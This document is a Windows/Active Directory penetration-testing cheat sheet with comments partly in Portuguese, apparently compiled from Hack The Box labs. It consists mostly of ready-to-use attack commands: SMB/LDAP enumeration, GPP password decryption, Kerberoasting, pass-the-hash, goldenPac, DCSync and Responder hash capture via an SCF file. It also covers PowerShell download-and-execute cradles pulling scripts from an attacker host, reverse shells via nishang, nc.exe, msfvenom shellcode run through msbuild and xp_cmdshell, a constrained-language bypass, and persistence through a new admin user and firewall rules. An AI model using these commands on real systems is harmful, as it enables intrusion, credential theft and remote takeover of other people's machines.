<!-- TOC -->

-   [1. SMB](#1-smb)
    -   [1.1. SMBClient](#11-smbclient)
    -   [1.2. SMBMap](#12-smbmap)
-   [2. Get SubDomain - DNS](#2-get-subdomain-dns)
-   [3. SYSVOL - Group Policy Preference - GPP](#3-sysvol-group-policy-preference-gpp)
    -   [3.1. gpp-decrypt](#31-gpp-decrypt)
-   [4. CrackMapExec](#4-crackmapexec)
-   [5. rpcclient](#5-rpcclient)
-   [6. impacket](#6-impacket)
    -   [6.1. impacket-GetNPUsers](#61-impacket-getnpusers)
    -   [6.2. impacket-GetADUsers](#62-impacket-getadusers)
    -   [6.3. impacket-GetUserSPNs](#63-impacket-getuserspns)
    -   [6.4. impacket-psexec (pth-winexe em alternativa para hashes)](#64-impacket-psexec-pth-winexe-em-alternativa-para-hashes)
    -   [impacket-goldenPac](#impacket-goldenpac)
    -   [6.5. Kerberos](#65-kerberos)
        -   [6.5.1. Kerberos - impacket-GetNPUsers](#651-kerberos-impacket-getnpusers)
-   [7. ldapdomaindump - ActiveDirectory Viewer](#7-ldapdomaindump-activedirectory-viewer)
-   [8. Evil-WinRM](#8-evil-winrm)
-   [9. Mounting recursos partilhados por rede pela vítima](#9-mounting-recursos-partilhados-por-rede-pela-vítima)
    -   [9.1. Mount / umount](#91-mount-umount)
        -   [9.1.1. Verificar se se pode escrever e onde com simples bash - MOUNTED DRIVE](#911-verificar-se-se-pode-escrever-e-onde-com-simples-bash-mounted-drive)
        -   [9.1.2. Responder](#912-responder)
    -   [9.2. NBD virtual file sistem - VHD](#92-nbd-virtual-file-sistem-vhd)
-   [10. SAM SYSTEM - SamDump2](#10-sam-system-samdump2)
-   [11. Active Directory View Graph Neo4j - BloodHound](#11-active-directory-view-graph-neo4j-bloodhound)
-   [12. Active directory - Microsoft Active Directory Certificate Services](#12-active-directory-microsoft-active-directory-certificate-services)
-   [13. File Transfere](#13-file-transfere)
    -   [13.1. Simple transfere](#131-simple-transfere)
    -   [13.2. SMB mount and transfere](#132-smb-mount-and-transfere)
-   [14. SeImpersonatePrivilege](#14-seimpersonateprivilege)
-   [16. Enumeration](#16-enumeration)
-   [17. WhiteList Directory](#17-whitelist-directory)
-   [18. ConsoleHost_history](#18-consolehost_history)
-   [19. PowerUp.ps1](#19-powerupps1)
-   [20. Wesng - Vulnerability kernel founder](#20-wesng-vulnerability-kernel-founder)
-   [21. Windows Exploit Suggester (Python script)](#21-windows-exploit-suggester-python-script)
-   [22. CMD to PowerShell](#22-cmd-to-powershell)
-   [23. PSByPassCLM](#23-psbypassclm)
-   [24. Check Env](#24-check-env)
-   [25. Allow Connection - Rules Firewall (Criação de percistência)](#25-allow-connection-rules-firewall-criação-de-percistência)
-   [26. DCSync Attack - Active Directory](#26-dcsync-attack-active-directory)
-   [MYSQL for Windows - mssqlclient.py (Impacket)](#mysql-for-windows-mssqlclientpy-impacket)
-   [Windows AutoLogin - powershell ==>> reverse shell + change user](#windows-autologin-powershell-reverse-shell-change-user)
-   [27. Usefull Softwares](#27-usefull-softwares)

<!-- /TOC -->

# 1. SMB

## 1.1. SMBClient

```bash
smbclient -L \\\\10.10.10.10\\                       # Enumera as pastas não ocultas em modo anonymous
smbclient -p 1234 \\\\10.10.10.10\\                  # Especifica uma porta diferente da normal (445)
smbclient \\\\10.10.10.10\\directory                 # Tenta entrar para a pasta "directory" do share SMB
smbclient -k \\\\10.10.10.10\\                       # Kerberos mode
smbclient -U USERNAME -N \\\\10.10.10.10\\           # Tenta entrar com username sem password
smbclient -U USERNAME -P PASSWORD \\\\10.10.10.10\\
smbclient -W WORKGROUP \\\\10.10.10.10\\

# Descargar tudo de forma recursiva (EXEMPLO)
smbclient //10.10.10.100/Replication -N
	Anonymous login successful
	Try "help" to get a list of possible commands.
	smb: \> dir
	  .                                   D        0  Sat Jul 21 11:37:44 2018
	  ..                                  D        0  Sat Jul 21 11:37:44 2018
	  active.htb                          D        0  Sat Jul 21 11:37:44 2018

					10459647 blocks of size 4096. 5728833 blocks available
	smb: \> recurse ON
	smb: \> prompt OFF
	smb: \> mget *

```

<div style="page-break-after: always;"></div>

## 1.2. SMBMap

```bash
smbmap -H 10.10.10.100   # Enumera as pastas compartilhadas e as suas permições
smbmap -H 10.10.10.40 -u 'null'  # Pode acontecer que sem a flag user preenchido, o alvo recusa a comunicação...
smbmap -u "SVC_TGS" -p "GPPstillStandingStrong2k18" -H 10.10.10.100
smbmap -u "SVC_TGS" -p "GPPstillStandingStrong2k18" -H 10.10.10.100 -R Users
smbmap -u "SVC_TGS" -p "GPPstillStandingStrong2k18" -H 10.10.10.100 -R Users -A user.txt



```

# 2. Get SubDomain - DNS

```bash
kali@kali: > nslookup
				> server 10.10.10.13
				> 10.10.10.13

kali@kali: >  dig @10.10.10.123 friendzone.red axfr
kali@kali: >  dnsenum --server 10.10.10.224 --threads 50 -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
kali@kali: >  host -t axfr friendzone.red 10.10.10.123

wfuzz -c --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -H "Host: FUZZ.forwardslash.htb" http://forwardslash.htb/

####################################################################
ldapsearch -h 10.10.10.161 -x
ldapsearch -h 10.10.10.161 -x -s base namingcontexts
ldapsearch -h 10.10.10.161 -x -b "DC=htb,DC=local" > enumeration/ldap-anonymous.out

```

# 3. SYSVOL - Group Policy Preference - GPP

> se for possível ler um arquivo "Groups.xml", provalvelmente se encontrará o seguinte:<br> &nbsp;&nbsp;&nbsp;&nbsp;- cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"<br> &nbsp;&nbsp;&nbsp;&nbsp;- userName="active.htb\SVC_TGS"

## 3.1. gpp-decrypt

> A simple ruby script that will decrypt a given GPP encrypted string

```bash
gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ

GPPstillStandingStrong2k18
```

# 4. CrackMapExec

> A swiss army knife for pentesting networks

```bash
crackmapexec smb 10.10.10.100
crackmapexec smb 10.10.10.100 -u "SVC_TGS" -p "GPPstillStandingStrong2k18"
crackmapexec smb 10.10.10.100 -u "SVC_TGS" -p "GPPstillStandingStrong2k18" --shares
crackmapexec smb 10.10.10.149 -u users.txt -p passwords.txt --shares
crackmapexec smb 10.10.10.149 -u Hazard -p stealth1agent --shares  --rid-brute

crackmapexec winrm 10.10.10.149 -u users.txt -p passwords.txt


```

# 5. rpcclient

> rpcclient - tool for executing client side MS-RPC functions (MS-RPC - Microsoft Remote Procedure Call)<br> Microsoft Remote Procedure Call, also known as a function call or a subroutine call, is a protocol that uses the client-server model in order to allow one program to request service from a program on another computer without having to understand the details of that computer's network

```bash´
rpcclient -U '' -N 10.10.10.161      # Modo interativo anonymous sem password
rpcclient -U "SVC_TGS" 10.10.10.100  # Modo interativo - Pede contra-senha
rpcclient $> enumdomusers            # Enumera todos os usuários locais do sistema
# A mesma sequencia de commandos pode-se efetuar com um oneliner:
rpcclient -U "SVC_TGS%GPPstillStandingStrong2k18" 10.10.10.100 -c "enumdomusers"

rpcclient -U "SVC_TGS%GPPstillStandingStrong2k18" 10.10.10.100 -c "enumdomgroups"
rpcclient -U "SVC_TGS%GPPstillStandingStrong2k18" 10.10.10.100 -c "querygroupmem 0x200"
rpcclient -U "SVC_TGS%GPPstillStandingStrong2k18" 10.10.10.100 -c "queryuser 0x1f4"

# OneLiner para descobrir todos os usuários com permições administrador local
echo; rpcclient -U "SVC_TGS%GPPstillStandingStrong2k18" 10.10.10.100 -c "querygroupmem 0x200" | awk '{print $1}' | grep -oP '\[.*?\]' | tr -d '[]' | while read rid; do echo "$rid: $(rpcclient -U "SVC_TGS%GPPstillStandingStrong2k18" 10.10.10.100 -c "queryuser $rid" | grep "User Name" | awk 'NF{print$NF}')"; done

```

# 6. impacket

## 6.1. impacket-GetNPUsers

```bash
impacket-GetNPUsers -dc-ip 10.10.10.161 -request htb.local/
```

## 6.2. impacket-GetADUsers

```bash
impacket-GetADUsers -all active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100
```

## 6.3. impacket-GetUserSPNs

```bash

impacket-GetUserSPNs active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request

# Syncronizar clock com a máquina
rdate -n 10.10.10.100
```

## 6.4. impacket-psexec (pth-winexe em alternativa para hashes)

```bash
impacket-psexec active.htb/Administrator:Ticketmaster1968@10.10.10.100
# Alternativa com hashes
winexe -U WORKGROUP/Administrator%aad3b435b515123687eea87687d67ee:cdf51b162460b7d5bc898f493751a0cc //10.10.10.40 cmd.exe
```

## impacket-goldenPac

> Engana o Active directory generando um ticket com permições máximas, e visto que o Active directory assume que tudo o que vem de kerberos é verdade, assume que (no caso de baixo) o usuário james é administrador do sistema, ficando automáticamente logado enquanto authority\system

```bash
# Prepare /etc/hosts... 10.10.10.52	mantis.htb.local htb.local
goldenPac.py htb.local/james:J@m3s_P@ssW0rd\!@mantis.htb.local
```

## 6.5. Kerberos

### 6.5.1. Kerberos - impacket-GetNPUsers

> Queries target domain for users with 'Do not require Kerberos preauthentication' set and export their TGTs for cracking

```bash
kali@kali: >  impacket-GetNPUsers realcorp.htb/ -no-pass -usersfile user.txt
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

$krb5asrep$18$j.nakazawa@REALCORP.HTB:38e284c38680906e8016e80b0eada5b1$5b0d997a09d7722c2584133be9ee2d69a5e03ab1d3ef2bffc8f7dcf3687b83d8cea5c71fd4aeef2b1ae0770194781a1fc41109789239d9d3553b92f39caabcd6c403d6d5b32a598a8cc70734c2944b8c17f2791835da4d8f989cda377d3e87c84340ab764d7c4fa110a5982bcf21f3c44ff34293fe1b043a330eccbe19d2c2b2b1e6b828d3ac6a672084c19a92f489aa90d0c375e4a49c307a11b95f3cb748b6e06df186b82cb0485dcd2524640aee4abf20fbe50b2adc14a526efe94995c602f931451c70384fe3ff50c71a34f7e624972d9436ffbdc1d1859a

kali@kali: >  impacket-GetNPUsers realcorp.htb/ -no-pass -usersfile user.txt > hash

```

# 7. ldapdomaindump - ActiveDirectory Viewer

```bash
python3 ldapdomaindump -u "htb.local\amanda" -p "Ashare1972" 10.10.10.103 -o ../../ldapdomaindumpresult
```

# 8. Evil-WinRM

```bash
evil-winrm -i 10.10.10.149 -u Chase -p 'Q4)sJu\Y8qz*A3?d'
```

# 9. Mounting recursos partilhados por rede pela vítima

## 9.1. Mount / umount

```bash
mount -t cifs //10.10.10.40/Users /mnt/smbmounted -o username=null,password=null,domain=WORKGROUP,rw
mount -t cifs //10.10.10.161/SYSVOL /mnt/smbmounted -o username=svc-alfresco,password=s3rvice,domain=htb.local
sudo mount -t cifs //10.10.10.100/Users /mnt/smbmounted -o username=SVC_TGS,password=GPPstillStandingStrong2k18,domain=active.htb,rw  # mount -t (tipo de filesistem) cifs (common internet file system) de onde, para qual pasta, -o (parametro de opções)
```

### 9.1.1. Verificar se se pode escrever e onde com simples bash - MOUNTED DRIVE

```bash
find . -type d | while read directory; do
touch /mnt/smbmounted/${directory}/javali 2>/dev/null && echo "Arquivo criado em - ${directory}" && rm /mnt/smbmounted/${directory}/javali
mkdir /mnt/smbmounted/${directory}/javali 2>/dev/null && echo "Directório criado em - ${directory}" && rmdir /mnt/smbmounted/${directory}/javali
done


```

### 9.1.2. Responder

```bash
# Em um directório smbmounted com permissões de escrita, e com alguma tarefa a ser executada (simulando um usuário a ler o arquivo)
echo "[Shell]" > file.scf
echo "Command=2" >> file.scf
echo "IconFile=\\\\\10.10.16.183\\smbFolder\\\testing" >> file.scf
```

```bash
responder -I tun0 -r -d -w
```

## 9.2. NBD virtual file sistem - VHD

```bash
modprobe nbd  # Creating virtual file system
rmmod nbd     # Removing virtual file system
qemu-nbd -c /dev/nbd0 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd  # creating accessibility virtual file system into /dev/nbd0
mount /dev/nbd0p1 /mnt/Bastion                                  # finally mount the virtual file system into /mnt/Bastion

```

# 10. SAM SYSTEM - SamDump2

```bash
# Em windows, os hashes do sistema estã armazenado em C:\Windows\System32\config\SAM e estão protegidos por C:\Windows\System32\config\SYSTEM
samdump2 SYSTEM SAM
john --wordlist=/usr/share/wordlists/rockyou.txt hash --format=NT
```

# 11. Active Directory View Graph Neo4j - BloodHound

```bash
kali@kali: > 	 sudo neo4j console
kali@kali: > 	 bloodhound --no-sandbox
kali@kali: >     wget https://github.com/BloodHoundAD/BloodHound/raw/master/Collectors/SharpHound.exe
kali@kali: >     smbserver.py smbFolder $(pwd) -user javali -password javali -smb2support

target@10.10.10.10: >     net use \\10.10.16.183\smbFolder /u:javali javali
target@10.10.10.10: >     copy \\10.10.16.183\smbFolder\SharpHound.exe C:\Windows\Temp\SharpHound.exe
target@10.10.10.10: > 	  C:\Windows\Temp\SharpHound.exe -c all

kali@kali: > # Import XXXXXXXXXX_BloodHound.zip to the graph
```

# 12. Active directory - Microsoft Active Directory Certificate Services

```bash
openssl req -newkey rsa:2048 -nodes -keyout amanda.key -out amanda.csr
rlwrap ruby winrm_shell.rb
```

# 13. File Transfere

## 13.1. Simple transfere

```powershell
powershell -c "Invoke-WebRequest -Uri 'https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/winPEAS/winPEASexe/binaries/x86/Release/winPEASx86.exe' -OutFile 'C:\Windows\Temp\winPEAS.exe'"  # Download a file from the web
certutil -urlcache -f http://10.11.30.195:8000/shell.exe shell.exe # Download a file from the web
iex​(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1') # Download a file from the web
```

```bash
kali@kali: > scp L4mpje@10.10.10.134:\Users\L4mpje\AppData\Roaming\mRemoteNG\confCons.xml confCons.xml
```

```bash
target@10.10.10.10: > $pass = convertto-securestring 'test123' -AsPlainText -Force
target@10.10.10.10: > $pass  # StdOut correct is System.Security.SecureString
target@10.10.10.10: > $cred = New-Object System.Management.Automation.PSCredential('javali', $pass)
target@10.10.10.10: > $cred  # StdOut correct is:
							 # UserName                     Password
							 # --------                     --------
							 # javali   System.Security.SecureString
target@10.10.10.10: > New-PSDrive -Name javali -PSProvider FileSystem -Credential $cred -Root \\10.10.14.3\smbshare
target@10.10.10.10: > cd javali:  # This is the share drive
```

## 13.2. SMB mount and transfere

```bash
kali@kali: > impacket-smbserver smbshare $(pwd) -smb2support -user javali -password test123
```

# 14. SeImpersonatePrivilege

https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/

# 16. Enumeration

```powershell
Get-LocalUser
setspn -T medin -Q */*  # Enumerar SPN (Kerberoast attack)
```

# 17. WhiteList Directory

```powershell
C:\Windows\System32\spool\drivers\color
```

# 18. ConsoleHost_history

```powershell
Get-Content %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

# 19. PowerUp.ps1

```powershell
cd C:\Windows\System32\spool\drivers\color
Invoke-WebRequest http://10.11.30.195:8000/PowerUp.ps1 -OutFile C:\Windows\System32\spool\drivers\color\PowerUp.ps1
Import-Module .\PowerUp.ps1
Invoke-AllChecks
```

#########################################

```bash
kali@kali: >     wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1
kali@kali: >     mv PowerUp.ps1 PU.ps1
kali@kali: >     echo -e "\n\nInvoke-AllChecks" >> PU.ps1
kali@kali: > 	 pythpon3 -m http.server 80

target@10.10.10.10: >     IEX(New-Object Net.WebClient).downloadString('http://10.10.14.3/PU.ps1')
```

# 20. Wesng - Vulnerability kernel founder

```bash
target@10.10.10.10: >     systeminfo  # Copy the output into kali "systeminfo.txt"

kali@kali: >     python3 wes.py ../systeminfo.txt -i "Elevation of Privilege"
```

# 21. Windows Exploit Suggester (Python script)

```bash
target@10.10.10.10: >     systeminfo  # Copy the output into kali "systeminfo.txt"

kali@kali: >     wget https://raw.githubusercontent.com/Pwnistry/Windows-Exploit-Suggester-python3/master/windows-exploit-suggester.py
kali@kali: >     python3 windows-exploit-suggester.py --update
kali@kali: >     python3 windows-exploit-suggester.py -i ../systeminfo.txt -d 2021-07-11-mssb.xls
```

# 22. CMD to PowerShell

```bash
kali@kali: > 	 git clone https://github.com/samratashok/nishang.git
kali@kali: > 	 cd Shells
kali@kali: > 	 mv Invoke-PowerShellTcp.ps1 IP.ps1
kali@kali: > 	 echo -e "\n\nInvoke-PowerShellTcp -Reverse -IPAddress 10.10.14.3 -Port 443" >> IP.ps1
kali@kali: > 	 python3 -m http.server 80

target@10.10.10.10: >     start /b C:\Windows\SysNative\WindowsPowerShell\v1.0\powershell.exe -exec bypass -C "IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.4:80/IP.ps1')"
target@10.10.10.10: >     start /b C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe -exec bypass -C "IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.4:80/IP.ps1')"
```

# 23. PSByPassCLM

```bash
# if:
# PS htb\amanda@SIZZLE Documents> $executioncontext.sessionstate.languagemode
# ConstrainedLanguage
# else:
git clone https://github.com/padovah4ck/PSByPassCLM.git
cd PSByPassCLM/PSBypassCLM/PSBypassCLM/bin/Debug
python3 -m http.server 80

# Máquina vítima
IWR -URI http://10.10.16.183/PsBypassCLM.exe -OutFile CLM.exe
dir C:\Windows\microsoft.net\framework64\  # Check last version dir
# Prepare rlwrap nc -lvnp 443
C:\Windows\microsoft.net\framework64\v4.0.30319\InstallUtil.exe /logfile=/LogToConsole=True /U /revshell=true /rhost=10.10.16.183 /rport=443 C:\Users\amanda\downloads\CLM.exe
```

############################### OU ###############################

```bash
wget https://raw.githubusercontent.com/3gstudent/msbuild-inline-task/master/executes%20shellcode.xml
msfvenom --platform windows -p windows/shell_reverse_tcp LHOST=10.10.16.183 LPORT=443 -e x86/shikata_ga_nai -i 20 -f csharp -o rev_session_443.cs -v shellcode
cat rev_session_443.cs | xclip -sel clip
# Edit Var shellcode to the new reverse shell code
python3 -m http.server 80
# On windows
IWR -URI http://10.10.16.183/revshell.xml -OutFile revshell.csproj
C:\Windows\Microsoft.NET\framework\v4.0.30319\msbuild.exe revshell.csproj

```

# 24. Check Env

```bash
[Environment]::Is64BitOperatingSystem
[Environment]::Is64BitProcess
```

# 25. Allow Connection - Rules Firewall (Criação de percistência)

```powershell
# Criação de um novo usuário
net user javali javali123! /add
# Adicionar esse novo usuário ao grupo administrators
net localgroup Administrators javali /add
# Adicionar permições de executar commandos fora do sistema local (via web...)
cmd /c reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
```

```powershell
netsh advfirewall firewall add rule name="Samba Port" protocol=TCP dir=in localport=445 action=allow
netsh advfirewall firewall add rule name="Samba Port" protocol=TCP dir=out localport=445 action=allow

net share attacker_folder=C:\Windows\Temp /GRANT:Administrators,FULL
cmd /c reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f

```

# 26. DCSync Attack - Active Directory

```bash
secretsdump.py -just-dc mrlky:Football#7@10.10.10.103
wmiexec.py -hashes :f6b7160bfc91823792e0ac3a162c9267 Administrator@10.10.10.103

```

# MYSQL for Windows - mssqlclient.py (Impacket)

```bash
mssqlclient.py WORKGROUP/reporting:PcwTWTHRwryjc\$c6@10.10.10.125 -db volume -windows-auth
# Pilhar Hashes
kali@kali: >     responder -I tun0
target@10.10.10.10: >     xp_dirtree '\\10.10.14.6\javali'
# Abilitar RCE
target@10.10.10.10: >     xp_cmdshell "whoami"
target@10.10.10.10: >     sp_configure "show advanced options",1
target@10.10.10.10: >     reconfigure
target@10.10.10.10: >     sp_configure "xp_cmdshell", 1
target@10.10.10.10: >     reconfigure
target@10.10.10.10: >     xp_cmdshell "whoami"


# Download Files
target@10.10.10.10: >     xp_cmdshell "powershell Invoke-WebRequest http://10.10.14.4:8000/nc.exe -o C:\Windows\Temp\nc.exe"
target@10.10.10.10: >     xp_cmdshell "start /b C:\Windows\Temp\nc.exe -e cmd 10.10.14.4 444"  # Get reverse shell cmd

```

# Windows AutoLogin - powershell ==>> reverse shell + change user

```powershell
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
#	...
#	LastUsedUsername    REG_SZ    Administrator
#	DefaultPassword    REG_SZ    3130438f31186fbaf962f407711faddb
hostname
#	BART
$username = "BART\Administrator"
$password = "3130438f31186fbaf962f407711faddb"
$secstr = New-Object -TypeName System.Security.SecureString
$password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}
$cred = New-Object -TypeName System.Management.Automation.PSCredential -argumentlist $username, $secstr
$command = {IEX(New-Object Net.WebClient).downloadString("http://10.10.14.4:80/IP2.ps1")}
Invoke-Command -ScriptBlock $command -Credential $cred -ComputerName localhost


```

# 27. Usefull Softwares

> evil-winrm <br> PowerSploit (GitHub) <br> wesng (github) <br> ldapdomaindump (github) <br> winrm_shell (GitHub Alamot) <br> Ghostpack-CompliedBinaries Rubeus.exe (Github)
